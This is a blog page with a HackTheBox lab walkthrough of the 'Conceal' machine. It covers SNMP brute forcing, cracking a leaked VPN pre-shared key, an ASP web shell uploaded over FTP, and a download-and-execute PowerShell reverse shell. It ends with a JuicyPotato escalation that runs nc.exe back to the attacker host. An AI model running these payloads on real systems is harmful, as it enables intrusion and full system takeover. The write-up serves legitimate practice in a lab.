<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Conceal | PwndSide</title><meta name=keywords content="privesc,web,windows,ftp,snmp"><meta name=description content="This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/conceal-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/conceal-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Conceal"><meta property="og:description" content="This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-13T19:26:37+02:00"><meta property="article:modified_time" content="2023-09-13T19:26:37+02:00"><meta property="article:tag" content="Privesc"><meta property="article:tag" content="Web"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Ftp"><meta property="article:tag" content="Snmp"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Conceal"><meta name=twitter:description content="This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Conceal","item":"https://pwndside.github.io/posts/conceal-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Conceal","name":"Conceal","description":"This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe.","keywords":["privesc","web","windows","ftp","snmp"],"articleBody":"Room Information Room name: Conceal Difficulty level: Hard Room link: https://app.hackthebox.com/machines/Conceal Port Scanning sudo nmap $IP -p- -n -Pn -vvv --min-rate 5000 As always I started enumerating TCP ports but no one seems open so I decided to perform an UDP scan to the 1000 more common ports.\nsudo nmap $IP -sU -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 161/udp open snmp udp-response ttl 127 SNMPv1 server (public) 500/udp open isakmp? udp-response ttl 127 | fingerprint-strings: | IKE_MAIN_MODE: | \"3DUfw | XEW( | IPSEC_START: |_ YW(c 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port500-UDP:V=7.94%I=7%D=9/12%Time=6500286D%P=arm-apple-darwin22.4.0%r( SF:IKE_MAIN_MODE,D0,\"\\0\\x11\\\"3DUfw\\x9a\\x882\\x20\\xd0\\rIC\\x01\\x10\\x02\\0\\0\\0\\ SF:0\\0\\0\\0\\0\\xd0\\r\\0\\x008\\0\\0\\0\\x01\\0\\0\\0\\x01\\0\\0\\0,\\x01\\x01\\0\\x01\\0\\0\\0\\$ SF:\\x01\\x01\\0\\0\\x80\\x01\\0\\x05\\x80\\x02\\0\\x02\\x80\\x04\\0\\x02\\x80\\x03\\0\\x01\\x8 SF:0\\x0b\\0\\x01\\0\\x0c\\0\\x04\\0\\0\\0\\x01\\r\\0\\0\\x18\\x1e\\+Qi\\x05\\x99\\x1c}\\|\\x96\\ SF:xfc\\xbf\\xb5\\x87\\xe4a\\0\\0\\0\\t\\r\\0\\0\\x14J\\x13\\x1c\\x81\\x07\\x03XE\\\\W\\(\\xf2\\ SF:x0e\\x95E/\\r\\0\\0\\x14\\x90\\xcb\\x80\\x91\u003e\\xbbin\\x08c\\x81\\xb5\\xecB{\\x1f\\r\\0\\0 SF:\\x14@H\\xb7\\xd5n\\xbc\\xe8\\x85%\\xe7\\xde\\x7f\\0\\xd6\\xc2\\xd3\\r\\0\\0\\x14\\xfb\\x1 SF:d\\xe3\\xcd\\xf3A\\xb7\\xea\\x16\\xb7\\xe5\\xbe\\x08U\\xf1\\x20\\0\\0\\0\\x14\\xe3\\xa5\\x SF:96jv7\\x9f\\xe7\\x07\\\"\\x821\\xe5\\xce\\x86R\")%r(IPSEC_START,38,\"1'\\xfc\\xb08\\x SF:10\\x9e\\x89\\xa3HVa\\x1c\\xfc-\\xd8\\x0b\\x10\\x05\\0YW\\(c\\0\\0\\x008\\0\\0\\0\\x1c\\0\\ SF:0\\0\\x01\\x01\\x10\\0\\x0e1'\\xfc\\xb08\\x10\\x9e\\x89\\xa3HVa\\x1c\\xfc-\\xd8\"); Service Info: Host: Conceal 161 is a snmp port as we have seen before we can access to a bunch of information about the remote machine and a IPSEC/IKE VPN port.\nEnumerating UDP First I started with enumerating snmp.\nSNMP is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behaviour.\nIn order to access to that information we need a community string which is a kind of password.\nThere is a github python script calles snmpbrute.py with helps to bruteforce community strings.\npython3 snmpbrute.py -t 10.10.10.116 -p 161 10.10.10.116 : 161 Version (v1):\tpublic 10.10.10.116 : 161 Version (v2c):\tpublic There are a lot of similar tools as snmpbrute but snmpbrute gives us v2c community strings which normally contain more info.\nExploiting UDP Well now we have a valid community string, in order to access to the hidden info I am gonna use snmpbulkwalk.\nsnmpbulkwalk -c public -v 2c $IP \u003e snmpenum I saved the scan output in a file because normally is so long.\nIf we check the first lines theres is a PSK password for IKE VPN\nSNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43 Also we can found some hidden TCP ports.\nTCP-MIB::tcpConnectionState.unknown.\"\".21.unknown.\"\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.unknown.\"\".80.unknown.\"\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.unknown.\"\".445.unknown.\"\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".135.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49664.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49665.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49666.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49667.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49668.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49669.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"0.0.0.0\".49670.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) TCP-MIB::tcpConnectionState.ipv4.\"10.10.10.116\".139.ipv4.\"0.0.0.0\".0 = INTEGER: listen(2) If we return to the nmap scan there is other open port with a IKE VPN.\nFirst letâ€™s talk about with what we are dealing now. IPsec is the most commonly used technology for LAN to LAN and enterprise VPN.\nIKE is a type of ISAKMP (Internet Security Association Key Management Protocol) implementation.\nThanks to a Hacktricks post I found a command which helps us to know if there is a IKE VPN listening.\nike-scan -M 10.10.10.116 Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/) 10.10.10.116\tMain Mode Handshake returned HDR=(CKY-R=478fed0dd59df637) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n) VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation) VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable) VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1) Ending ike-scan 1.9.5: 1 hosts scanned in 0.123 seconds (8.11 hosts/sec). 1 returned handshake; 0 returned notify The output shows what SA (security association) is using which specifies security properties that are recognized by communicating hosts.\nike-scan -M 10.10.10.116 -2 I have run the same command with ikev2 but failed. That helps us because now we know the ike version which is running is v1.\nI tried to run again the same command in aggressive mode but is useless because we already know the hash.\nSo we have a SA, the version and the password hash, we only need to configure the VPN with these parameters in order to connect.\nBut before that letâ€™s crack the hash.\nI used hashes.com in order to crack it\n9c8b1a372b1878851be2c097031b6e43:Dudecake1! A tool called strongSwan which helps to connect easily to an IPSEC VPN.\nBut before connecting we need to configure /etc/ipsec.conf and /etc/ipsec.secrets\nAfter a several try and error, using man ipsec.conf and man ipsec.secrets I achieved a working config file.\n# ipsec.secrets - strongSwan IPsec secrets file %any : PSK \"Dudecake1!\" # ipsec.conf - strongSwan IPsec configuration file # basic configuration config setup charondebug=\"all\" conn conceal authby=secret ike=3des-sha1-modp1024! esp=3des-sha1! type=transport keyexchange=ikev1 left=10.10.10.116 right=10.10.14.9 auto=add In ipsec.secrets only we need to add one line for the specifying the password %any : PSK \"Dudecake1!\"\nIn ipsec.conf we need to put more stuff, first we need to specify a new connection I have called it conceal, then I specify some values:\nauthby=secretuse PSK auth specified on the secrets file. ike, esp, and keyexchange are set based on information from ike-scan. left and right are for the local and remote IP address. type=transport - use transport mode.(This parameter was a guess). auto=add was a guess too. Also I have changed some parameters for the setup configurations like (but there are optional):\ncharondebug=\"all\" - be more verbose to help me troubleshoot the connection. Now letâ€™s start the service to connect to the VPN.\nsudo ipsec start sudo ipsec up conceal Once executed the following error was outputted.\ninitiating Main Mode IKE_SA conceal[1] to 10.10.10.116 generating ID_PROT request 0 [ SA V V V V V ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (176 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (208 bytes) parsed ID_PROT response 0 [ SA V V V V V V ] received MS NT5 ISAKMPOAKLEY vendor ID received NAT-T (RFC 3947) vendor ID received draft-ietf-ipsec-nat-t-ike-02\\n vendor ID received FRAGMENTATION vendor ID received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20 received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52 selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024 generating ID_PROT request 0 [ KE No NAT-D NAT-D ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (244 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (260 bytes) parsed ID_PROT response 0 [ KE No NAT-D NAT-D ] generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (100 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (68 bytes) parsed ID_PROT response 0 [ ID HASH ] IKE_SA conceal[1] established between 10.10.14.9[10.10.14.9]...10.10.10.116[10.10.10.116] scheduling reauthentication in 10238s maximum IKE_SA lifetime 10778s generating QUICK_MODE request 2092714236 [ HASH SA No ID ID ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (164 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (76 bytes) parsed INFORMATIONAL_V1 request 1438899382 [ HASH N(INVAL_ID) ] received INVALID_ID_INFORMATION error notify establishing connection 'conceal' failed We have a INVALID_ID_INFORMATION error\nSearching on google I found a IPSEC VPN troubleshooting post.\nIn the post this type of error is occurring on the phase 2 so as the phase 1 is finished is not a credential error. And the error is exactly a network mismatch.\nThen I realized that the tcp ports arenâ€™t displayed in the nmap scan but the UDP are so maybe the VPN is hiding only the TCP ports.\nIf we add the parameter leftsubnet=10.10.10.116[tcp] on the connection part of ipsec.conf file, the VPN only will running on the TCP ports and should work correctly.\ninitiating Main Mode IKE_SA conceal[1] to 10.10.10.116 generating ID_PROT request 0 [ SA V V V V V ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (176 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (208 bytes) parsed ID_PROT response 0 [ SA V V V V V V ] received MS NT5 ISAKMPOAKLEY vendor ID received NAT-T (RFC 3947) vendor ID received draft-ietf-ipsec-nat-t-ike-02\\n vendor ID received FRAGMENTATION vendor ID received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20 received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52 selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024 generating ID_PROT request 0 [ KE No NAT-D NAT-D ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (244 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (260 bytes) parsed ID_PROT response 0 [ KE No NAT-D NAT-D ] generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (100 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (68 bytes) parsed ID_PROT response 0 [ ID HASH ] IKE_SA conceal[1] established between 10.10.14.9[10.10.14.9]...10.10.10.116[10.10.10.116] scheduling reauthentication in 9912s maximum IKE_SA lifetime 10452s generating QUICK_MODE request 3169062681 [ HASH SA No ID ID ] sending packet: from 10.10.14.9[500] to 10.10.10.116[500] (164 bytes) received packet: from 10.10.10.116[500] to 10.10.14.9[500] (188 bytes) parsed QUICK_MODE response 3169062681 [ HASH SA No ID ID ] selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ CHILD_SA conceal{1} established with SPIs c44d2140_i 0c2d93b4_o and TS 10.10.14.9/32 === 10.10.10.116/32[tcp] connection 'conceal' established successfully Well we have established successfully the connection.\nEnumerating TCP So letâ€™s retry the TCP scan again.\nWith a SYN port scan nothing is outputted but the TCP scan worked.\nThe scan is taking too long so letâ€™s focus in scan only the ports outputted by snmp.\nnmap $IP -p21,80,445,133,139 -n -Pn --min-rate=5000 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-13T15:38:03 |_ start_date: 2023-09-13T15:36:01 | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: -1s As always I am gonna start with the website.\nIs a default IIS 10.0 homepage.\nLetâ€™s do a quick fuzz.\ngobuster dir -u http://10.10.10.116/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save =============================================================== Starting gobuster in directory enumeration mode =============================================================== /upload (Status: 301) [Size: 150] [--\u003e http://10.10.10.116/upload/] =============================================================== Finished =============================================================== Only one directory letâ€™s take a look\n/upload seems to be empty.\nAt this point I start enumerating the ftp but when I login anonymously I donâ€™t found anything.\nIn the uploads directory of the website we donâ€™t find anything as well so I have attempted to upload something to the ftp share in order to know if itâ€™s the same directory.\nSo I create a test folder to see if the website list it.\nWe can see that uploads list now new content.\nExploiting TCP Well we can upload files, so as the website is Windows maybe is running ASP.NET letâ€™s try to upload a aspx web shell.\n\u003c% Set rs = CreateObject(\"WScript.Shell\") Set cmd = rs.Exec(\"whoami\") Response.Write(cmd.StdOut.ReadAll) %\u003e When I try to access to the shell the page display the above 404 error. If we read the page, the error is due to the extension configuration also we can see that ASP.NET is used.\nAs we have an extension problem, should we try to execute the shell with other ASP.NET extensions like asp.\nThe shell is working now.\nNow we have RCE letâ€™s send the Nishang TCP reverse shell.\nWe can perform it only changing the whoami command.\n\u003c% Set rs = CreateObject(\"WScript.Shell\") Set cmd = rs.Exec(\"cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/PS.ps1')\") Response.Write(cmd.StdOut.ReadAll) %\u003e Basically the command we are executing download the script from a python http server which we are gonna open before where is located the Nishang script as PS.ps1\nAs always I am going to put Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444 at the end of the Nishang script in order to execute the shell.\nNow only rests to set a nc listener and let the magic happens.\nnc -lv 4444 Gaining an Initial Foothold We are not NT AUTHORITY\\SYSTEM so we need to privEsc.\nEscalating Privilege First I am going to see the current privileges.\nwhoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeShutdownPrivilege Shut down the system Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled The SeImpersonatePrivilege allow us to use tools like JuicyPotato to privEsc.\nFirst we need to see if our system works with JuicyPotato.\nsysteminfo Host Name: CONCEAL OS Name: Microsoft Windows 10 Enterprise OS Version: 10.0.15063 N/A Build 15063 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00329-00000-00003-AA343 Original Install Date: 12/10/2018, 20:04:27 System Boot Time: 13/09/2023, 16:35:46 System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-gb;English (United Kingdom) Input Locale: en-gb;English (United Kingdom) Time Zone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London Total Physical Memory: 2,047 MB Available Physical Memory: 1,164 MB Virtual Memory: Max Size: 3,199 MB Virtual Memory: Available: 2,253 MB Virtual Memory: In Use: 946 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: No IP address(es) [01]: 10.10.10.116 [02]: fe80::1031:d377:eff5:6cba [03]: dead:beef::c888:9715:2be0:f364 [04]: dead:beef::1031:d377:eff5:6cba [05]: dead:beef::248 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. The current version is vulnerable so I copied the JuicyPotato binary with smbserver.py in order to execute it.\nsmbserver.py smbFolder $(pwd) -smb2support copy \\\\10.10.14.9\\smbFolder\\JuicyPotato.exe . Once copied I have executed it with the following arguments.\n.\\JuicyPotato.exe -t * -p \\Windows\\System32\\cmd.exe -l 1338 -a \"/c \\\\10.10.14.9\\smbFolder\\nc.exe -e cmd 10.10.14.9 4445\" With a smbserver on the nc.exe binary and setting a nc listener on our local machine, we are able to do a reverse shell as root.\nnc -lv 4445 We have had a CLSID testing error.\nGoogling I found a post with a bunch of valid CLSID for JuicyPotato.\nI start testing with wuauserv which probably be enabled\n.\\JuicyPotato.exe -t * -p \\Windows\\System32\\cmd.exe -l 1338 -a \"/c \\\\10.10.14.9\\smbFolder\\nc.exe -e cmd 10.10.14.9 4445\" -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}' We pwnd Conceal ðŸ‘½.\nFlag(s) ","wordCount":"2272","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-09-13T19:26:37+02:00","dateModified":"2023-09-13T19:26:37+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/conceal-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Conceal</h1><div class=post-description>This machine has IPSEC VPN hiding the TCP ports thanks to the password leaked by snmp we gain access to those ports. The RCE is achieved by uploading a asp file to the website via ftp. We privEsc exploiting SeImpersonatePrivilege with JuicyPotato.exe.</div><div class=post-meta><span title='2023-09-13 19:26:37 +0200 CEST'>September 13, 2023</span>&nbsp;Â·&nbsp;11 min&nbsp;Â·&nbsp;2272 words&nbsp;Â·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/conceal-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumerating-udp>Enumerating UDP</a></li><li><a href=#exploiting-udp>Exploiting UDP</a></li><li><a href=#enumerating-tcp>Enumerating TCP</a></li><li><a href=#exploiting-tcp>Exploiting TCP</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li><li><a href=#flags>Flag(s)</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Conceal</li><li>Difficulty level: Hard</li><li>Room link: <a href=https://app.hackthebox.com/machines/Conceal>https://app.hackthebox.com/machines/Conceal</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/conceal-icon.png></p><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -p- -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><p>As always I started enumerating <strong>TCP</strong> ports but no one seems open so I decided to perform an <strong>UDP</strong> scan to the 1000 more common ports.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -sU -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT    STATE SERVICE REASON               VERSION
</span></span><span class=line><span class=cl>161/udp open  snmp    udp-response ttl <span class=m>127</span> SNMPv1 server <span class=o>(</span>public<span class=o>)</span>
</span></span><span class=line><span class=cl>500/udp open  isakmp? udp-response ttl <span class=m>127</span>
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   IKE_MAIN_MODE:
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=s2>&#34;3DUfw
</span></span></span><span class=line><span class=cl><span class=s2>|     XEW(
</span></span></span><span class=line><span class=cl><span class=s2>|   IPSEC_START:
</span></span></span><span class=line><span class=cl><span class=s2>|_    YW(c
</span></span></span><span class=line><span class=cl><span class=s2>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span class=line><span class=cl><span class=s2>SF-Port500-UDP:V=7.94%I=7%D=9/12%Time=6500286D%P=arm-apple-darwin22.4.0%r(
</span></span></span><span class=line><span class=cl><span class=s2>SF:IKE_MAIN_MODE,D0,&#34;</span><span class=se>\0\x</span>11<span class=se>\&#34;</span>3DUfw<span class=se>\x</span>9a<span class=se>\x</span>882<span class=se>\x</span>20<span class=se>\x</span>d0<span class=se>\r</span>IC<span class=se>\x</span>01<span class=se>\x</span>10<span class=se>\x</span>02<span class=se>\0\0\0\
</span></span></span><span class=line><span class=cl><span class=se></span>SF:0<span class=se>\0\0\0\0\x</span>d0<span class=se>\r\0\x</span>008<span class=se>\0\0\0\x</span>01<span class=se>\0\0\0\x</span>01<span class=se>\0\0\0</span>,<span class=se>\x</span>01<span class=se>\x</span>01<span class=se>\0\x</span>01<span class=se>\0\0\0\$</span>
</span></span><span class=line><span class=cl>SF:<span class=se>\x</span>01<span class=se>\x</span>01<span class=se>\0\0\x</span>80<span class=se>\x</span>01<span class=se>\0\x</span>05<span class=se>\x</span>80<span class=se>\x</span>02<span class=se>\0\x</span>02<span class=se>\x</span>80<span class=se>\x</span>04<span class=se>\0\x</span>02<span class=se>\x</span>80<span class=se>\x</span>03<span class=se>\0\x</span>01<span class=se>\x</span><span class=m>8</span>
</span></span><span class=line><span class=cl>SF:0<span class=se>\x</span>0b<span class=se>\0\x</span>01<span class=se>\0\x</span>0c<span class=se>\0\x</span>04<span class=se>\0\0\0\x</span>01<span class=se>\r\0\0\x</span>18<span class=se>\x</span>1e<span class=se>\+</span>Qi<span class=se>\x</span>05<span class=se>\x</span>99<span class=se>\x</span>1c<span class=o>}</span><span class=se>\|\x</span>96<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>SF:xfc<span class=se>\x</span>bf<span class=se>\x</span>b5<span class=se>\x</span>87<span class=se>\x</span>e4a<span class=se>\0\0\0\t\r\0\0\x</span>14J<span class=se>\x</span>13<span class=se>\x</span>1c<span class=se>\x</span>81<span class=se>\x</span>07<span class=se>\x</span>03XE<span class=se>\\</span>W<span class=se>\(\x</span>f2<span class=se>\
